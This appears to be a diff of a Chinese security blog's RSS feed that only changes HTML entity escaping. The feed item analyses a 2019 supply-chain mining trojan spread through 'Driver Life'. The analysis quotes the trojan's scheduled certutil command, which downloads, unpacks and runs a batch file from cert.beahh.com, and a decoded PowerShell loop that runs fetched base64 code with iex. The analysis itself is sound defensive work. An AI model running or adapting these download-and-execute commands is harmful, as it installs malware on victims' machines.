@@ -1,20 +1,20 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>应急响应 on 倾旋的博客</title><link>https://payloads.online/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</link><description>Recent content in 应急响应 on 倾旋的博客</description><generator>Hugo</generator><language>zh-cn</language><copyright>倾旋 All rights reserved</copyright><lastBuildDate>Sat, 23 Feb 2019 00:00:00 +0000</lastBuildDate><atom:link href="https://payloads.online/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/index.xml" rel="self" type="application/rss+xml"/><item><title>驱动人生供应链木马攻击2019.1.30变种木马分析</title><link>https://payloads.online/archivers/2019-02-23/1/</link><pubDate>Sat, 23 Feb 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-02-23/1/</guid><description>&lt;h2 id="0x00-事件背景">0x00 事件背景&lt;/h2>
-&lt;p>360安全大脑监测到通过&amp;quot;驱动人生&amp;quot;供应链攻击传播的挖矿木马在1月30日下午4时左右再次更新。此次更新中，木马在此前抓取系统帐户密码的基础上增加了抓取密码hash值的功能，并试图通过pass the hash攻击进行横向渗透，使得该木马的传播能力进一步加强，即使是有高强度口令的机器也有可能被攻陷。&lt;/p>
-&lt;p>pass the hash也称作哈希传递攻击，攻击者可以直接通过密码的哈希值访问远程主机或服务，而不用提供明文密码。攻击者使用pass the hash技术尝试在系统登录密码非弱口令并且无法抓取登录密码的情况下进行横向攻击，增加攻击成功率。&lt;/p>
-&lt;h2 id="0x01-分析研讨">0x01 分析研讨&lt;/h2>
-&lt;p>由于木马是样本都是不落地的方式，核心技术是通过定时计划任务执行powershell代码达到持续控制的目的，因此最先分析powershell代码，了解它做了哪些动作，指定查杀手段。&lt;/p>
-&lt;p>PS:样本代码过长，遂使用图片截图&lt;/p>
-&lt;h2 id="0x02-分析过程">0x02 分析过程&lt;/h2>
-&lt;h3 id="解密第一层">解密第一层&lt;/h3>
-&lt;p>病毒样本：&lt;/p>
-&lt;p>&lt;img src="https://images.payloads.online/4d16b518-4f5f-11ec-b05e-00d861bf4abb.png" alt="">&lt;/p>
-&lt;p>第一个动作，创建一个名为&lt;code>Certificate&lt;/code>的任务计划，在七点开始，每隔一小时执行一次以下命令：&lt;/p>
-&lt;pre tabindex="0">&lt;code>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>应急响应 on 倾旋的博客</title><link>https://payloads.online/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</link><description>Recent content in 应急响应 on 倾旋的博客</description><generator>Hugo</generator><language>zh-cn</language><copyright>倾旋 All rights reserved</copyright><lastBuildDate>Sat, 23 Feb 2019 00:00:00 +0000</lastBuildDate><atom:link href="https://payloads.online/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/index.xml" rel="self" type="application/rss+xml"/><item><title>驱动人生供应链木马攻击2019.1.30变种木马分析</title><link>https://payloads.online/archivers/2019-02-23/1/</link><pubDate>Sat, 23 Feb 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-02-23/1/</guid><description>&lt;h2 id="0x00-事件背景"&gt;0x00 事件背景&lt;/h2&gt;
+&lt;p&gt;360安全大脑监测到通过&amp;quot;驱动人生&amp;quot;供应链攻击传播的挖矿木马在1月30日下午4时左右再次更新。此次更新中，木马在此前抓取系统帐户密码的基础上增加了抓取密码hash值的功能，并试图通过pass the hash攻击进行横向渗透，使得该木马的传播能力进一步加强，即使是有高强度口令的机器也有可能被攻陷。&lt;/p&gt;
+&lt;p&gt;pass the hash也称作哈希传递攻击，攻击者可以直接通过密码的哈希值访问远程主机或服务，而不用提供明文密码。攻击者使用pass the hash技术尝试在系统登录密码非弱口令并且无法抓取登录密码的情况下进行横向攻击，增加攻击成功率。&lt;/p&gt;
+&lt;h2 id="0x01-分析研讨"&gt;0x01 分析研讨&lt;/h2&gt;
+&lt;p&gt;由于木马是样本都是不落地的方式，核心技术是通过定时计划任务执行powershell代码达到持续控制的目的，因此最先分析powershell代码，了解它做了哪些动作，指定查杀手段。&lt;/p&gt;
+&lt;p&gt;PS:样本代码过长，遂使用图片截图&lt;/p&gt;
+&lt;h2 id="0x02-分析过程"&gt;0x02 分析过程&lt;/h2&gt;
+&lt;h3 id="解密第一层"&gt;解密第一层&lt;/h3&gt;
+&lt;p&gt;病毒样本：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://images.payloads.online/4d16b518-4f5f-11ec-b05e-00d861bf4abb.png" alt=""&gt;&lt;/p&gt;
+&lt;p&gt;第一个动作，创建一个名为&lt;code&gt;Certificate&lt;/code&gt;的任务计划，在七点开始，每隔一小时执行一次以下命令：&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;
 cmd.exe /c (cd %temp%&amp;amp;certutil -urlcache -split -f http://cert.beahh.com/cert.php?ver1=%COMPUTERNAME% v.dat&amp;gt;nul&amp;amp;expand -r v.dat&amp;gt;nul&amp;amp;v.bat&amp;gt;nul&amp;amp;del v.dat v.bat&amp;gt;nul)
-&lt;/code>&lt;/pre>&lt;p>由于目前&lt;code>cert.beahh.com&lt;/code>已经无法访问，所以进行下一个powershell分析环节。&lt;/p>
-&lt;p>首先，&lt;code>powershell -nop -w hidden -ep bypass -e &lt;/code>后接着就是base64编码的powershell代码，并且以Bypass作为当前执行策略。&lt;/p>
-&lt;p>Windows中的powershell执行策略：&lt;/p>
-&lt;pre tabindex="0">&lt;code>PS C:\Users\Rvn0xsy&amp;gt; Get-ExecutionPolicy -List
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;由于目前&lt;code&gt;cert.beahh.com&lt;/code&gt;已经无法访问，所以进行下一个powershell分析环节。&lt;/p&gt;
+&lt;p&gt;首先，&lt;code&gt;powershell -nop -w hidden -ep bypass -e &lt;/code&gt;后接着就是base64编码的powershell代码，并且以Bypass作为当前执行策略。&lt;/p&gt;
+&lt;p&gt;Windows中的powershell执行策略：&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;PS C:\Users\Rvn0xsy&amp;gt; Get-ExecutionPolicy -List
 
  Scope ExecutionPolicy
  ----- ---------------
@@ -23,10 +23,10 @@ MachinePolicy Undefined
  Process Undefined
  CurrentUser Undefined
  LocalMachine Bypass
-&lt;/code>&lt;/pre>&lt;p>将后面的base64解密后：&lt;/p>
-&lt;p>&lt;img src="https://images.payloads.online/4d5d8218-4f5f-11ec-baeb-00d861bf4abb.png" alt="">&lt;/p>
-&lt;p>得到如下代码：&lt;/p>
-&lt;pre tabindex="0">&lt;code>while($true)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;将后面的base64解密后：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://images.payloads.online/4d5d8218-4f5f-11ec-baeb-00d861bf4abb.png" alt=""&gt;&lt;/p&gt;
+&lt;p&gt;得到如下代码：&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;while($true)
 {
 [System.Threading.Thread]::Sleep(200000);
 [string]$m = (getmac /FO CSV|Select-Object -Skip 1 -first 1| ConvertFrom-Csv -Header MAC|select-object -expand MAC)
@@ -36,4 +36,4 @@ $c = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(
 iex $c;
 [System.Threading.Thread]::Sleep(1000000);
 }
-&lt;/code>&lt;/pre>&lt;p>外部是一个循环，将Sleep去除后，可以看到调用了&lt;code>Invoke-Expression&lt;/code>，&lt;code>Invoke-Expression&lt;/code>是一个能将变量的内容当作powershell表达式执行的函数。&lt;/p></description></item></channel></rss>
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;外部是一个循环，将Sleep去除后，可以看到调用了&lt;code&gt;Invoke-Expression&lt;/code&gt;，&lt;code&gt;Invoke-Expression&lt;/code&gt;是一个能将变量的内容当作powershell表达式执行的函数。&lt;/p&gt;</description></item></channel></rss>
